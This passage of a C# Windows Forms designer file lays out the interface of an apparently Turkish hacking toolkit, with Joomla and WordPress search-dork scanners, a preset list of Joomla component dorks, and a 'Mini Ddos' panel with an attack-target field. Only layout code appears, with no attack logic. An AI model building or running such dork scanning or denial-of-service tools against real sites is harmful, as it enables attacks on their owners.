            this.pictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox7.TabIndex = 6;
            this.pictureBox7.TabStop = false;
            this.pictureBox7.Click += new System.EventHandler(this.PictureBox7_Click);
            // 
            // panel9
            // 
            this.panel9.BackColor = System.Drawing.Color.White;
            this.panel9.Controls.Add(this.iTalk_GroupBox5);
            this.panel9.Controls.Add(this.iTalk_GroupBox4);
            this.panel9.Controls.Add(this.panel14);
            this.panel9.Controls.Add(this.panel13);
            this.panel9.Controls.Add(this.panel12);
            this.panel9.Controls.Add(this.panel11);
            this.panel9.Location = new System.Drawing.Point(530, 229);
            this.panel9.Name = "panel9";
            this.panel9.Size = new System.Drawing.Size(96, 69);
            this.panel9.TabIndex = 21;
            // 
            // iTalk_GroupBox5
            // 
            this.iTalk_GroupBox5.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox5.Controls.Add(this.webBrowser2);
            this.iTalk_GroupBox5.Controls.Add(this.button5);
            this.iTalk_GroupBox5.Controls.Add(this.iTalk_Button_27);
            this.iTalk_GroupBox5.Controls.Add(this.iTalk_Button_28);
            this.iTalk_GroupBox5.Controls.Add(this.iTalk_Button_29);
            this.iTalk_GroupBox5.Controls.Add(this.iTalk_Button_210);
            this.iTalk_GroupBox5.Controls.Add(this.label19);
            this.iTalk_GroupBox5.Controls.Add(this.label20);
            this.iTalk_GroupBox5.Controls.Add(this.listBox5);
            this.iTalk_GroupBox5.Controls.Add(this.label18);
            this.iTalk_GroupBox5.Controls.Add(this.label16);
            this.iTalk_GroupBox5.Controls.Add(this.özeldork);
            this.iTalk_GroupBox5.Controls.Add(this.label17);
            this.iTalk_GroupBox5.Controls.Add(this.hazırdork);
            this.iTalk_GroupBox5.Location = new System.Drawing.Point(319, 44);
            this.iTalk_GroupBox5.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox5.Name = "iTalk_GroupBox5";
            this.iTalk_GroupBox5.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox5.Size = new System.Drawing.Size(298, 421);
            this.iTalk_GroupBox5.TabIndex = 7;
            this.iTalk_GroupBox5.Text = "Joomla Dork Tarayıcı";
            // 
            // webBrowser2
            // 
            this.webBrowser2.Location = new System.Drawing.Point(-1, 130);
            this.webBrowser2.MinimumSize = new System.Drawing.Size(20, 20);
            this.webBrowser2.Name = "webBrowser2";
            this.webBrowser2.Size = new System.Drawing.Size(20, 250);
            this.webBrowser2.TabIndex = 16;
            // 
            // button5
            // 
            this.button5.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button5.Image = ((System.Drawing.Image)(resources.GetObject("button5.Image")));
            this.button5.Location = new System.Drawing.Point(223, 333);
            this.button5.Name = "button5";
            this.button5.Size = new System.Drawing.Size(40, 36);
            this.button5.TabIndex = 15;
            this.button5.UseVisualStyleBackColor = true;
            this.button5.Click += new System.EventHandler(this.Button5_Click);
            // 
            // iTalk_Button_27
            // 
            this.iTalk_Button_27.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_27.Font = new System.Drawing.Font("Segoe UI", 14F);
            this.iTalk_Button_27.ForeColor = System.Drawing.Color.Black;
            this.iTalk_Button_27.Image = null;
            this.iTalk_Button_27.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.iTalk_Button_27.Location = new System.Drawing.Point(223, 391);
            this.iTalk_Button_27.Name = "iTalk_Button_27";
            this.iTalk_Button_27.Size = new System.Drawing.Size(69, 23);
            this.iTalk_Button_27.TabIndex = 26;
            this.iTalk_Button_27.Text = "Seç";
            this.iTalk_Button_27.TextAlignment = System.Drawing.StringAlignment.Center;
            this.iTalk_Button_27.Click += new System.EventHandler(this.İTalk_Button_27_Click);
            // 
            // iTalk_Button_28
            // 
            this.iTalk_Button_28.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_28.Font = new System.Drawing.Font("Segoe UI", 14F);
            this.iTalk_Button_28.ForeColor = System.Drawing.Color.Black;
            this.iTalk_Button_28.Image = null;
            this.iTalk_Button_28.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.iTalk_Button_28.Location = new System.Drawing.Point(151, 391);
            this.iTalk_Button_28.Name = "iTalk_Button_28";
            this.iTalk_Button_28.Size = new System.Drawing.Size(69, 23);
            this.iTalk_Button_28.TabIndex = 25;
            this.iTalk_Button_28.Text = "Kaydet ";
            this.iTalk_Button_28.TextAlignment = System.Drawing.StringAlignment.Center;
            this.iTalk_Button_28.Click += new System.EventHandler(this.İTalk_Button_28_Click);
            // 
            // iTalk_Button_29
            // 
            this.iTalk_Button_29.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_29.Font = new System.Drawing.Font("Segoe UI", 14F);
            this.iTalk_Button_29.ForeColor = System.Drawing.Color.Black;
            this.iTalk_Button_29.Image = null;
            this.iTalk_Button_29.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.iTalk_Button_29.Location = new System.Drawing.Point(79, 391);
            this.iTalk_Button_29.Name = "iTalk_Button_29";
            this.iTalk_Button_29.Size = new System.Drawing.Size(69, 23);
            this.iTalk_Button_29.TabIndex = 24;
            this.iTalk_Button_29.Text = "Durdur";
            this.iTalk_Button_29.TextAlignment = System.Drawing.StringAlignment.Center;
            this.iTalk_Button_29.Click += new System.EventHandler(this.İTalk_Button_29_Click);
            // 
            // iTalk_Button_210
            // 
            this.iTalk_Button_210.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_210.Font = new System.Drawing.Font("Segoe UI", 14F);
            this.iTalk_Button_210.ForeColor = System.Drawing.Color.Black;
            this.iTalk_Button_210.Image = null;
            this.iTalk_Button_210.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.iTalk_Button_210.Location = new System.Drawing.Point(7, 391);
            this.iTalk_Button_210.Name = "iTalk_Button_210";
            this.iTalk_Button_210.Size = new System.Drawing.Size(69, 23);
            this.iTalk_Button_210.TabIndex = 23;
            this.iTalk_Button_210.Text = "Başlat";
            this.iTalk_Button_210.TextAlignment = System.Drawing.StringAlignment.Center;
            this.iTalk_Button_210.Click += new System.EventHandler(this.İTalk_Button_210_Click);
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label19.Location = new System.Drawing.Point(92, 374);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(13, 13);
            this.label19.TabIndex = 22;
            this.label19.Text = "0";
            // 
            // label20
            // 
            this.label20.AutoSize = true;
            this.label20.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label20.Location = new System.Drawing.Point(8, 374);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(85, 13);
            this.label20.TabIndex = 21;
            this.label20.Text = "Toplam Dork >";
            // 
            // listBox5
            // 
            this.listBox5.FormattingEnabled = true;
            this.listBox5.Location = new System.Drawing.Point(11, 146);
            this.listBox5.Name = "listBox5";
            this.listBox5.Size = new System.Drawing.Size(279, 225);
            this.listBox5.TabIndex = 20;
            // 
            // label18
            // 
            this.label18.AutoSize = true;
            this.label18.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label18.Location = new System.Drawing.Point(13, 130);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(43, 13);
            this.label18.TabIndex = 19;
            this.label18.Text = "Tarama";
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label16.Location = new System.Drawing.Point(13, 87);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(91, 13);
            this.label16.TabIndex = 18;
            this.label16.Text = "Özel Dorklar :";
            // 
            // özeldork
            // 
            this.özeldork.BackColor = System.Drawing.Color.Transparent;
            this.özeldork.Font = new System.Drawing.Font("Tahoma", 11F);
            this.özeldork.ForeColor = System.Drawing.Color.Black;
            this.özeldork.Location = new System.Drawing.Point(110, 36);
            this.özeldork.MaxLength = 32767;
            this.özeldork.Multiline = false;
            this.özeldork.Name = "özeldork";
            this.özeldork.ReadOnly = false;
            this.özeldork.Size = new System.Drawing.Size(180, 28);
            this.özeldork.TabIndex = 17;
            this.özeldork.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.özeldork.UseSystemPasswordChar = false;
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label17.Location = new System.Drawing.Point(8, 43);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(103, 13);
            this.label17.TabIndex = 15;
            this.label17.Text = "Kendi Dorkunuz :";
            // 
            // hazırdork
            // 
            this.hazırdork.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(246)))), ((int)(((byte)(246)))), ((int)(((byte)(246)))));
            this.hazırdork.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.hazırdork.DropDownHeight = 100;
            this.hazırdork.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.hazırdork.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.hazırdork.ForeColor = System.Drawing.Color.Black;
            this.hazırdork.FormattingEnabled = true;
            this.hazırdork.HoverSelectionColor = System.Drawing.Color.FromArgb(((int)(((byte)(241)))), ((int)(((byte)(241)))), ((int)(((byte)(241)))));
            this.hazırdork.IntegralHeight = false;
            this.hazırdork.ItemHeight = 20;
            this.hazırdork.Items.AddRange(new object[] {
            "com_sitemap.",
            "com_user.",
            "com_mailto.",
            "com_eventlist.",
            "com_performs.",
            "com_admin.",
            "com_cw.",
            "com_pinboard.",
            "com_hashcash.",
            "com_forum."});
            this.hazırdork.Location = new System.Drawing.Point(110, 80);
            this.hazırdork.Name = "hazırdork";
            this.hazırdork.Size = new System.Drawing.Size(180, 26);
            this.hazırdork.StartIndex = 0;
            this.hazırdork.TabIndex = 16;
            // 
            // iTalk_GroupBox4
            // 
            this.iTalk_GroupBox4.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox4.Controls.Add(this.webBrowser1);
            this.iTalk_GroupBox4.Controls.Add(this.button4);
            this.iTalk_GroupBox4.Controls.Add(this.iTalk_Button_26);
            this.iTalk_GroupBox4.Controls.Add(this.iTalk_Button_25);
            this.iTalk_GroupBox4.Controls.Add(this.iTalk_Button_24);
            this.iTalk_GroupBox4.Controls.Add(this.iTalk_Button_23);
            this.iTalk_GroupBox4.Controls.Add(this.label15);
            this.iTalk_GroupBox4.Controls.Add(this.label21);
            this.iTalk_GroupBox4.Controls.Add(this.listBox4);
            this.iTalk_GroupBox4.Controls.Add(this.label22);
            this.iTalk_GroupBox4.Controls.Add(this.label23);
            this.iTalk_GroupBox4.Controls.Add(this.özel);
            this.iTalk_GroupBox4.Controls.Add(this.hazır);
            this.iTalk_GroupBox4.Controls.Add(this.label24);
            this.iTalk_GroupBox4.Location = new System.Drawing.Point(16, 44);
            this.iTalk_GroupBox4.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox4.Name = "iTalk_GroupBox4";
            this.iTalk_GroupBox4.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox4.Size = new System.Drawing.Size(298, 421);
            this.iTalk_GroupBox4.TabIndex = 6;
            this.iTalk_GroupBox4.Text = "Wordpress Dork Tarayıcı";
            // 
            // webBrowser1
            // 
            this.webBrowser1.Location = new System.Drawing.Point(285, 130);
            this.webBrowser1.MinimumSize = new System.Drawing.Size(20, 20);
            this.webBrowser1.Name = "webBrowser1";
            this.webBrowser1.Size = new System.Drawing.Size(20, 250);
            this.webBrowser1.TabIndex = 15;
            // 
            // button4
            // 
            this.button4.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Image = ((System.Drawing.Image)(resources.GetObject("button4.Image")));
            this.button4.Location = new System.Drawing.Point(223, 333);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(40, 36);
            this.button4.TabIndex = 14;
            this.button4.UseVisualStyleBackColor = true;
            this.button4.Click += new System.EventHandler(this.Button4_Click);
            // 
            // iTalk_Button_26
            // 
            this.iTalk_Button_26.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_26.Font = new System.Drawing.Font("Segoe UI", 14F);
            this.iTalk_Button_26.ForeColor = System.Drawing.Color.Black;
            this.iTalk_Button_26.Image = null;
            this.iTalk_Button_26.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.iTalk_Button_26.Location = new System.Drawing.Point(223, 391);
            this.iTalk_Button_26.Name = "iTalk_Button_26";
            this.iTalk_Button_26.Size = new System.Drawing.Size(69, 23);
            this.iTalk_Button_26.TabIndex = 13;
            this.iTalk_Button_26.Text = "Seç";
            this.iTalk_Button_26.TextAlignment = System.Drawing.StringAlignment.Center;
            this.iTalk_Button_26.Click += new System.EventHandler(this.İTalk_Button_26_Click);
            // 
            // iTalk_Button_25
            // 
            this.iTalk_Button_25.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_25.Font = new System.Drawing.Font("Segoe UI", 14F);
            this.iTalk_Button_25.ForeColor = System.Drawing.Color.Black;
            this.iTalk_Button_25.Image = null;
            this.iTalk_Button_25.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.iTalk_Button_25.Location = new System.Drawing.Point(151, 391);
            this.iTalk_Button_25.Name = "iTalk_Button_25";
            this.iTalk_Button_25.Size = new System.Drawing.Size(69, 23);
            this.iTalk_Button_25.TabIndex = 12;
            this.iTalk_Button_25.Text = "Kaydet ";
            this.iTalk_Button_25.TextAlignment = System.Drawing.StringAlignment.Center;
            this.iTalk_Button_25.Click += new System.EventHandler(this.İTalk_Button_25_Click);
            // 
            // iTalk_Button_24
            // 
            this.iTalk_Button_24.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_24.Font = new System.Drawing.Font("Segoe UI", 14F);
            this.iTalk_Button_24.ForeColor = System.Drawing.Color.Black;
            this.iTalk_Button_24.Image = null;
            this.iTalk_Button_24.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.iTalk_Button_24.Location = new System.Drawing.Point(79, 391);
            this.iTalk_Button_24.Name = "iTalk_Button_24";
            this.iTalk_Button_24.Size = new System.Drawing.Size(69, 23);
            this.iTalk_Button_24.TabIndex = 11;
            this.iTalk_Button_24.Text = "Durdur";
            this.iTalk_Button_24.TextAlignment = System.Drawing.StringAlignment.Center;
            this.iTalk_Button_24.Click += new System.EventHandler(this.İTalk_Button_24_Click);
            // 
            // iTalk_Button_23
            // 
            this.iTalk_Button_23.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Button_23.Font = new System.Drawing.Font("Segoe UI", 14F);
            this.iTalk_Button_23.ForeColor = System.Drawing.Color.Black;
            this.iTalk_Button_23.Image = null;
            this.iTalk_Button_23.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.iTalk_Button_23.Location = new System.Drawing.Point(7, 391);
            this.iTalk_Button_23.Name = "iTalk_Button_23";
            this.iTalk_Button_23.Size = new System.Drawing.Size(69, 23);
            this.iTalk_Button_23.TabIndex = 10;
            this.iTalk_Button_23.Text = "Başlat";
            this.iTalk_Button_23.TextAlignment = System.Drawing.StringAlignment.Center;
            this.iTalk_Button_23.Click += new System.EventHandler(this.İTalk_Button_23_Click);
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label15.Location = new System.Drawing.Point(92, 374);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(13, 13);
            this.label15.TabIndex = 9;
            this.label15.Text = "0";
            // 
            // label21
            // 
            this.label21.AutoSize = true;
            this.label21.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label21.Location = new System.Drawing.Point(8, 374);
            this.label21.Name = "label21";
            this.label21.Size = new System.Drawing.Size(85, 13);
            this.label21.TabIndex = 8;
            this.label21.Text = "Toplam Dork >";
            // 
            // listBox4
            // 
            this.listBox4.FormattingEnabled = true;
            this.listBox4.Location = new System.Drawing.Point(11, 146);
            this.listBox4.Name = "listBox4";
            this.listBox4.Size = new System.Drawing.Size(279, 225);
            this.listBox4.TabIndex = 7;
            // 
            // label22
            // 
            this.label22.AutoSize = true;
            this.label22.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label22.Location = new System.Drawing.Point(13, 130);
            this.label22.Name = "label22";
            this.label22.Size = new System.Drawing.Size(43, 13);
            this.label22.TabIndex = 6;
            this.label22.Text = "Tarama";
            // 
            // label23
            // 
            this.label23.AutoSize = true;
            this.label23.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label23.Location = new System.Drawing.Point(13, 87);
            this.label23.Name = "label23";
            this.label23.Size = new System.Drawing.Size(91, 13);
            this.label23.TabIndex = 5;
            this.label23.Text = "Özel Dorklar :";
            // 
            // özel
            // 
            this.özel.BackColor = System.Drawing.Color.Transparent;
            this.özel.Font = new System.Drawing.Font("Tahoma", 11F);
            this.özel.ForeColor = System.Drawing.Color.Black;
            this.özel.Location = new System.Drawing.Point(110, 36);
            this.özel.MaxLength = 32767;
            this.özel.Multiline = false;
            this.özel.Name = "özel";
            this.özel.ReadOnly = false;
            this.özel.Size = new System.Drawing.Size(180, 28);
            this.özel.TabIndex = 4;
            this.özel.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.özel.UseSystemPasswordChar = false;
            // 
            // hazır
            // 
            this.hazır.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(246)))), ((int)(((byte)(246)))), ((int)(((byte)(246)))));
            this.hazır.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.hazır.DropDownHeight = 100;
            this.hazır.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.hazır.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.hazır.ForeColor = System.Drawing.Color.Black;
            this.hazır.FormattingEnabled = true;
            this.hazır.HoverSelectionColor = System.Drawing.Color.FromArgb(((int)(((byte)(241)))), ((int)(((byte)(241)))), ((int)(((byte)(241)))));
            this.hazır.IntegralHeight = false;
            this.hazır.ItemHeight = 20;
            this.hazır.Location = new System.Drawing.Point(110, 80);
            this.hazır.Name = "hazır";
            this.hazır.Size = new System.Drawing.Size(180, 26);
            this.hazır.StartIndex = 0;
            this.hazır.TabIndex = 2;
            // 
            // label24
            // 
            this.label24.AutoSize = true;
            this.label24.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label24.Location = new System.Drawing.Point(8, 43);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(103, 13);
            this.label24.TabIndex = 0;
            this.label24.Text = "Kendi Dorkunuz :";
            // 
            // panel14
            // 
            this.panel14.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel14.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel14.Location = new System.Drawing.Point(10, 59);
            this.panel14.Name = "panel14";
            this.panel14.Size = new System.Drawing.Size(76, 10);
            this.panel14.TabIndex = 5;
            // 
            // panel13
            // 
            this.panel13.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel13.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel13.Location = new System.Drawing.Point(86, 36);
            this.panel13.Name = "panel13";
            this.panel13.Size = new System.Drawing.Size(10, 33);
            this.panel13.TabIndex = 4;
            // 
            // panel12
            // 
            this.panel12.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel12.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel12.Location = new System.Drawing.Point(0, 36);
            this.panel12.Name = "panel12";
            this.panel12.Size = new System.Drawing.Size(10, 33);
            this.panel12.TabIndex = 3;
            // 
            // panel11
            // 
            this.panel11.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel11.Controls.Add(this.label14);
            this.panel11.Controls.Add(this.button2);
            this.panel11.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel11.Location = new System.Drawing.Point(0, 0);
            this.panel11.Name = "panel11";
            this.panel11.Size = new System.Drawing.Size(96, 36);
            this.panel11.TabIndex = 1;
            this.panel11.Paint += new System.Windows.Forms.PaintEventHandler(this.Panel11_Paint);
            this.panel11.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel11_MouseDown);
            this.panel11.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel11_MouseMove);
            this.panel11.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel11_MouseUp);
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label14.ForeColor = System.Drawing.Color.White;
            this.label14.Location = new System.Drawing.Point(260, 11);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(116, 17);
            this.label14.TabIndex = 12;
            this.label14.Text = "< Dork Tarayıcı >";
            // 
            // button2
            // 
            this.button2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button2.ForeColor = System.Drawing.Color.White;
            this.button2.Location = new System.Drawing.Point(602, 7);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(23, 22);
            this.button2.TabIndex = 4;
            this.button2.Text = "X";
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new System.EventHandler(this.Button2_Click);
            // 
            // dorkt
            // 
            this.dorkt.Tick += new System.EventHandler(this.Dorkt_Tick);
            // 
            // joomla
            // 
            this.joomla.Tick += new System.EventHandler(this.Joomla_Tick);
            // 
            // panel16
            // 
            this.panel16.BackColor = System.Drawing.Color.White;
            this.panel16.Controls.Add(this.iTalk_GroupBox16);
            this.panel16.Controls.Add(this.iTalk_GroupBox12);
            this.panel16.Controls.Add(this.iTalk_GroupBox14);
            this.panel16.Controls.Add(this.iTalk_GroupBox13);
            this.panel16.Controls.Add(this.panel20);
            this.panel16.Controls.Add(this.panel19);
            this.panel16.Controls.Add(this.panel18);
            this.panel16.Controls.Add(this.panel17);
            this.panel16.Location = new System.Drawing.Point(629, 230);
            this.panel16.Name = "panel16";
            this.panel16.Size = new System.Drawing.Size(84, 67);
            this.panel16.TabIndex = 22;
            // 
            // iTalk_GroupBox16
            // 
            this.iTalk_GroupBox16.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox16.Controls.Add(this.monoFlat_Button3);
            this.iTalk_GroupBox16.Controls.Add(this.monoFlat_Button2);
            this.iTalk_GroupBox16.Controls.Add(this.monoFlat_Button1);
            this.iTalk_GroupBox16.Controls.Add(this.listBox2);
            this.iTalk_GroupBox16.Controls.Add(this.button11);
            this.iTalk_GroupBox16.Controls.Add(this.button12);
            this.iTalk_GroupBox16.Controls.Add(this.button13);
            this.iTalk_GroupBox16.Controls.Add(this.button14);
            this.iTalk_GroupBox16.Controls.Add(this.saldır);
            this.iTalk_GroupBox16.Controls.Add(this.iTalk_TextBox_Small3);
            this.iTalk_GroupBox16.Controls.Add(this.label48);
            this.iTalk_GroupBox16.Controls.Add(this.label47);
            this.iTalk_GroupBox16.Location = new System.Drawing.Point(352, 225);
            this.iTalk_GroupBox16.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox16.Name = "iTalk_GroupBox16";
            this.iTalk_GroupBox16.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox16.Size = new System.Drawing.Size(395, 246);
            this.iTalk_GroupBox16.TabIndex = 15;
            this.iTalk_GroupBox16.Text = "Mini Ddos ";
            // 
            // monoFlat_Button3
            // 
            this.monoFlat_Button3.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button3.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button3.Image = null;
            this.monoFlat_Button3.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button3.Location = new System.Drawing.Point(251, 211);
            this.monoFlat_Button3.Name = "monoFlat_Button3";
            this.monoFlat_Button3.Size = new System.Drawing.Size(97, 28);
            this.monoFlat_Button3.TabIndex = 29;
            this.monoFlat_Button3.Text = "TEMİZLE";
            this.monoFlat_Button3.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button3.Click += new System.EventHandler(this.MonoFlat_Button3_Click);
            // 
            // monoFlat_Button2
            // 
            this.monoFlat_Button2.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button2.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button2.Image = null;
            this.monoFlat_Button2.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button2.Location = new System.Drawing.Point(148, 211);
            this.monoFlat_Button2.Name = "monoFlat_Button2";
            this.monoFlat_Button2.Size = new System.Drawing.Size(97, 28);
            this.monoFlat_Button2.TabIndex = 28;
            this.monoFlat_Button2.Text = "DURDUR";
            this.monoFlat_Button2.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button2.Click += new System.EventHandler(this.MonoFlat_Button2_Click);
            // 
            // monoFlat_Button1
            // 
            this.monoFlat_Button1.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button1.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button1.Image = null;
            this.monoFlat_Button1.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button1.Location = new System.Drawing.Point(45, 211);
            this.monoFlat_Button1.Name = "monoFlat_Button1";
            this.monoFlat_Button1.Size = new System.Drawing.Size(97, 28);
            this.monoFlat_Button1.TabIndex = 27;
            this.monoFlat_Button1.Text = "BAŞLAT";
            this.monoFlat_Button1.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button1.Click += new System.EventHandler(this.MonoFlat_Button1_Click);
            // 
            // listBox2
            // 
            this.listBox2.BackColor = System.Drawing.Color.Black;
            this.listBox2.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.listBox2.ForeColor = System.Drawing.Color.Yellow;
            this.listBox2.FormattingEnabled = true;
            this.listBox2.Location = new System.Drawing.Point(9, 125);
            this.listBox2.Name = "listBox2";
            this.listBox2.Size = new System.Drawing.Size(377, 82);
            this.listBox2.TabIndex = 23;
            // 
            // button11
            // 
            this.button11.Location = new System.Drawing.Point(363, 106);
            this.button11.Name = "button11";
            this.button11.Size = new System.Drawing.Size(19, 13);
            this.button11.TabIndex = 22;
            this.button11.Text = "^";
            this.button11.UseVisualStyleBackColor = true;
            this.button11.Click += new System.EventHandler(this.Button11_Click);
            // 
            // button12
            // 
            this.button12.Location = new System.Drawing.Point(363, 94);
            this.button12.Name = "button12";
            this.button12.Size = new System.Drawing.Size(19, 13);
            this.button12.TabIndex = 21;
            this.button12.Text = "^";
            this.button12.UseVisualStyleBackColor = true;
            this.button12.Click += new System.EventHandler(this.Button12_Click);
            // 
            // button13
            // 
            this.button13.Location = new System.Drawing.Point(363, 94);
            this.button13.Name = "button13";
            this.button13.Size = new System.Drawing.Size(19, 13);
            this.button13.TabIndex = 20;
            this.button13.Text = "^";
            this.button13.UseVisualStyleBackColor = true;
            this.button13.Click += new System.EventHandler(this.Button13_Click);
            // 
            // button14
            // 
            this.button14.Location = new System.Drawing.Point(363, 94);
            this.button14.Name = "button14";
            this.button14.Size = new System.Drawing.Size(19, 13);
            this.button14.TabIndex = 19;
            this.button14.Text = "^";
            this.button14.UseVisualStyleBackColor = true;
            this.button14.Click += new System.EventHandler(this.Button14_Click);
            // 
            // saldır
            // 
            this.saldır.BackColor = System.Drawing.Color.Transparent;
            this.saldır.Font = new System.Drawing.Font("Tahoma", 11F);
            this.saldır.ForeColor = System.Drawing.Color.Black;
            this.saldır.Location = new System.Drawing.Point(101, 93);
            this.saldır.MaxLength = 32767;
            this.saldır.Multiline = false;
            this.saldır.Name = "saldır";
            this.saldır.ReadOnly = false;
            this.saldır.Size = new System.Drawing.Size(286, 28);
            this.saldır.TabIndex = 18;
            this.saldır.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.saldır.UseSystemPasswordChar = false;
            this.saldır.TextChanged += new System.EventHandler(this.Saldır_TextChanged);
            // 
            // iTalk_TextBox_Small3
            // 
            this.iTalk_TextBox_Small3.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_TextBox_Small3.Font = new System.Drawing.Font("Tahoma", 11F);
            this.iTalk_TextBox_Small3.ForeColor = System.Drawing.Color.Black;
